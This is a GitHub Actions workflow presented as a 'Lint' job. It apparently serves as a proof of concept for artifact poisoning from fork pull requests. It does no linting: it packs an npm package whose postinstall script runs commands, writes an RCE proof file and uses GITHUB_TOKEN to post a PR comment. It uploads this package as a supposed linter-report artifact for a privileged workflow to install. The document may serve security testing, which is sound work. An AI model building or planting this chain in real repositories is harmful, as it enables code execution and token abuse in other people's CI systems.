name: Lint
on:
  pull_request:
    branches: [main]
permissions:
  contents: read
jobs:
  lint:
    runs-on: ubuntu-latest
    steps:
      - name: FORK version marker
        run: echo "FORK_LINT_VERSION_RAN pr=${{ github.event.pull_request.number }}"
      - name: Craft poisoned artifact
        env:
          PR_NUMBER: ${{ github.event.pull_request.number }}
          NONCE: ${{ github.run_id }}-${{ github.run_attempt }}
        run: |
          set -e
          mkdir -p stage/pkg
          cd stage/pkg
          cat > package.json <<'JSON'
          {"name":"lint-util","version":"1.0.0","scripts":{"postinstall":"node post.js"}}
          JSON
          cat > post.js <<'JS'
          const fs = require('fs');
          const cp = require('child_process');
          console.log('PWNED_IN=' + process.env.GITHUB_WORKFLOW + ' event=' + process.env.GITHUB_EVENT_NAME + ' runner_uid=' + cp.execSync('id -u').toString().trim());
          console.log('PWNED_TOKEN=' + (process.env.GITHUB_TOKEN ? 'present' : 'absent'));
          fs.writeFileSync('/tmp/FORK_RCE_PROOF', 'workflow=' + process.env.GITHUB_WORKFLOW);
          (async () => {
            try {
              const base = process.env.GITHUB_WORKSPACE;
              const pr = fs.readFileSync(base + '/pr-number.txt', 'utf8').trim();
              const nonce = fs.readFileSync(base + '/nonce.txt', 'utf8').trim();
              const r = await fetch('https://api.github.com/repos/' + process.env.GITHUB_REPOSITORY + '/issues/' + pr + '/comments', {
                method: 'POST',
                headers: { 'Accept': 'application/vnd.github+json', 'Authorization': 'Bearer ' + process.env.GITHUB_TOKEN, 'Content-Type': 'application/json', 'X-GitHub-Api-Version': '2022-11-28' },
                body: JSON.stringify({ body: 'FORK_PR_RCE nonce=' + nonce + ' workflow=' + process.env.GITHUB_WORKFLOW })
              });
              console.log('PWNED_COMMENT_STATUS=' + r.status);
            } catch (e) { console.log('PWNED_COMMENT_ERROR=' + e); }
          })();
          JS
          npm pack --silent >/dev/null
          cd ../..
          mv stage/pkg/lint-util-1.0.0.tgz stage/lint-util-1.0.0.tgz
          rm -rf stage/pkg
          cat > stage/package.json <<'JSON'
          {"name":"report-consumer","version":"1.0.0","private":true,"dependencies":{"lint-util":"file:./lint-util-1.0.0.tgz"},"allowScripts":{"lint-util":true}}
          JSON
          printf 'attacker-supplied linter report\n' > stage/linter-report.txt
          printf '%s' "$PR_NUMBER" > stage/pr-number.txt
          printf 'FORK-RCE-%s\n' "$NONCE" > stage/nonce.txt
          ls -la stage
      - name: Upload linter report
        uses: actions/upload-artifact@v7
        with:
          name: linter-report
          path: stage/
          if-no-files-found: error
